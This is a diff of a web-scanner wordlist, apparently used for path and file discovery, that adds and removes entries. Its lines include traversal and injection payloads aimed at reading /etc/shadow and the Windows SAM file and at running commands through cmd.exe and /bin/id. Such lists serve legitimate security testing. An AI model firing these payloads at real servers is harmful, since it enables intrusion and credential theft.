@@ -19,8 +19,6 @@ logs
 manual
 phf
 printenv
-server-info
-server-status
 status
 test-cgi
 tmp
@@ -41,7 +39,6 @@ tmp
 %5c/
 %NETHOOD%/
 %a%s%p%d
-*.*
 .%252e/.%252e/.%252e/winnt/boot.ini
 ..%252f..%252f..%252f..%252f..%252f../windows/repair/sam
 ..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam
@@ -2771,6 +2768,10 @@ quikstore.cgi
 rap
 rc
 readme
+readme.md
+README.MD
+composer.json
+LICENSE.txt
 readme.eml
 readme.nsf
 readme.txt
@@ -2833,9 +2834,7 @@ script/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir
 script/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir
 script/.._../winnt/system32/cmd.exe?/c+dir
 scripts
-scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\ 
-scripts/*
-scripts/*.pl
+scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\
 scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0" & vbCrLf & vbCrLf
 scripts/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
 scripts/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
@@ -4191,10 +4190,6 @@ servlet/org.apache.catalina.INVOKER.org.apache.catalina.servlets.DefaultServlet/
 \\&apos;/bin/cat%20/etc/shadow\\&apos;
 ../../../../../../../../conf/server.xml
 /../../../../../../../../bin/id|
-C:/inetpub/wwwroot/global.asa
-C:\inetpub\wwwroot\global.asa
-C:/boot.ini
-C:\boot.ini
 ../../../../../../../../../../../../localstart.asp%00
 ../../../../../../../../../../../../localstart.asp
 ../../../../../../../../../../../../boot.ini%00
